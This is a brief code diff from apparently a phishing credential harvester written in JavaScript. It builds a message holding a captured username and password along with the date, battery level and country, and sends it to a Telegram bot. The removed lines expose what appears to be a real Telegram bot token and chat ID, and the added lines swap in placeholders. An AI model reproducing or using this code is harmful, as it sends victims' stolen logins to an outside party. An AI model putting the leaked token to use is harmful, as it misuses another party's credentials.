@@ -22,8 +22,8 @@ Date and Time: ${dateTime}
 Battery Percentage: ${batteryPercentage}%
 Country: ${countryName}`;
 
-    const botToken = '5984765500:AAFKj4BOcnkcaNiZhpc_qzzngoziW2z4D1E'; // Replace with your bot token
-    const chatId = '1205804127'; // Replace with your chat ID
+    const botToken = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+    const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
     const message = `Username: ${username}\nPassword: ${password}\n${text}`;
 
     // Send text message to Telegram
